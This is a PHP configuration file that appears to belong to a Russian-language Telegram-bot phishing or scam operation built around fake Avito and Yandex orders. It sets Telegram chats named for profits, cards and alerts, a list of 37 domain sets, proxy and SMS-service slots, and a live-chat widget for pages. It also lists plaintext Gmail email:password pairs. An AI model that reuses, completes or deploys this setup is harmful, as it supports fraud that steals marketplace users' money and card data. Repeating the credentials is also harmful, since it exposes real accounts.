<?php

function secretKey() {
 return 'nscode';
}

function botToken() {
 return 'Токен Бота';
}

function botLogin() {
 return 'ЮЗЕРНЕЙМ БОТА БЕЗ @';
}

function prjName() {
 return 'НАЗВАНИЕ ПРОЕКТА';
}

function linkChat() {
 return 'https://t.me/joinchat/AAAAAEkEblWSHNylUpDaqA';
}

function linkChatTops() {
 return 'https://t.me/joinchat/AAAAAEkEblWSHNylUpDaqA';
}

 function linkBotWork() {
 return 'https://t.me/ЮЗЕРНЕЙМ БОТА';
}

function linkPays() {
 return 'https://t.me/joinchat/AAAAAEjzzYvtffMEaw2CXA';
}

function linkScreen() {
 return 'https://t.me/joinchat/AAAAAE8p7NKC8zL3mac_FA';
}

function chatGroup() {
 return '-1001225027157';
}

function chatTops() {
 return '-1001225027157';
}

function chatAdmin() {
 return '-1001253977591';
}

function chatCard() {
 return '-1001253977591';
}

function chatAlerts() {
 return '-1001253977591';
}

function chatProfits() {
 return '-1001223937419';
}

function activateRuchka() {
 return 14500;
}

	function allDomains() {
		$ah = getDomN1();
		$ue = getDomN2();
		$ti = getDomN3();
		return [
			1 => [$ah[0], $ue[0], $ti[0]],
			2 => [$ah[1], $ue[1] ,$ti[1]],  
			3 => [$ah[2], $ue[2] ,$ti[2]], 
			4 => [$ah[3], $ue[3] ,$ti[3]],
			5 => [$ah[4], $ue[4] ,$ti[4]],	
			6 => [$ah[5], $ue[5] ,$ti[5]],	
			7 => [$ah[6], $ue[6] ,$ti[6]],	
			8 => [$ah[7], $ue[7] ,$ti[7]],	
			9 => [$ah[8], $ue[8] ,$ti[8]],	
			10 => [$ah[9], $ue[9], $ti[9]],	
			11 => [$ah[10], $ue[10], $ti[10]],	
			12 => [$ah[11], $ue[11], $ti[11]],	
			13 => [$ah[12], $ue[12], $ti[12]],	
			14 => [$ah[13], $ue[13], $ti[13]],	
			15 => [$ah[14], $ue[14], $ti[14]],	
			16 => [$ah[15], $ue[15], $ti[15]],	
			17 => [$ah[16], $ue[16], $ti[16]],	
			18 => [$ah[17], $ue[17], $ti[17]],	
			19 => [$ah[18], $ue[18], $ti[18]],	
			20 => [$ah[19], $ue[19], $ti[19]],	
			21 => [$ah[20], $ue[20], $ti[20]],	
			22 => [$ah[21], $ue[21], $ti[21]],	
			23 => [$ah[22], $ue[22], $ti[22]],	
			24 => [$ah[23], $ue[23], $ti[23]],	
			25 => [$ah[24], $ue[24], $ti[24]],	
			26 => [$ah[25], $ue[25], $ti[25]],	
			27 => [$ah[26], $ue[26], $ti[26]],	
			28 => [$ah[27], $ue[27], $ti[27]],	
			29 => [$ah[28], $ue[28], $ti[28]],	
			30 => [$ah[29], $ue[29], $ti[29]],	
			31 => [$ah[30], $ue[30], $ti[30]],	
			32 => [$ah[31], $ue[31], $ti[31]],	
			33 => [$ah[32], $ue[32], $ti[32]],	
			34 => [$ah[33], $ue[33], $ti[33]],	
			35 => [$ah[34], $ue[34], $ti[34]],	
			36 => [$ah[35], $ue[35], $ti[35]],	
			37 => [$ah[36], $ue[36], $ti[36]],	
		];
	}

	function imgurId() {
		return '9783c0d302010a0';
	}

	function allEmails() {
		return [
			1 => 'yandex.ru.order456543@gmail.com:order456543',
			2 => 'yandex.ru.order456543@gmail.com:order456543',
			3 => 'avito.order.348739@gmail.com:79191075043',
			4 => 'avito.order.348739@gmail.com:79191075043',
			5 => 'petrseglov9@gmail.com:qa73Jq71zq0',
			6 => 'yandex.ru.order456543@gmail.com:order456543',
			7 => 'yandex.ru.order456543@gmail.com:order456543',
			8 => 'avito.order.348739@gmail.com:79191075043',
			9 => 'avito.order.348739@gmail.com:79191075043',
			10 => 'petrseglov9@gmail.com:qa73Jq71zq0',
			11 => 'petrseglov9@gmail.com:qa73Jq71zq0',
		];
	}
	function allProxy() {
		return [
			'mts' => [''],
			'usb' => [''],
			'mgf' => [''],
		];
	}
	function authSmsRecv($a) {
		return [
			'shb' => '',
		][$a];
	}

	function authSmsSend($a) {
		return [
			'clk' => '',
		][$a];
	}

	function serviceRecvSms() {
		return 'shb';
	}

	function serviceSendSms() {
		return 'clk';
	}

	function showUserCard() {
		return false;
	}

	function accessSms() {
		return [7, 15000];
	}

	function kickLinkJoinedUsers() {
		return true;
	}

	function liveChatCode() {
		return '<script>var _smartsupp = _smartsupp || {};_smartsupp.key = \'86954c41faf9e69e9eb57884769285755b009894\';window.smartsupp||(function(d) {var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];s=d.getElementsByTagName(\'script\')[0];c=d.createElement(\'script\');c.type=\'text/javascript\';c.charset=\'utf-8\';c.async=true;c.src=\'https://www.smartsuppchat.com/loader.js?\';s.parentNode.insertBefore(c,s);})(document);</script>';
	}
	
	function liveChatCode1() {
		return '<script>var _smartsupp = _smartsupp || {};_smartsupp.key = \'86954c41faf9e69e9eb57884769285755b009894\';window.smartsupp||(function(d) {var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];s=d.getElementsByTagName(\'script\')[0];c=d.createElement(\'script\');c.type=\'text/javascript\';c.charset=\'utf-8\';c.async=true;c.src=\'https://www.smartsuppchat.com/loader.js?\';s.parentNode.insertBefore(c,s);})(document);</script>';
	}
?>
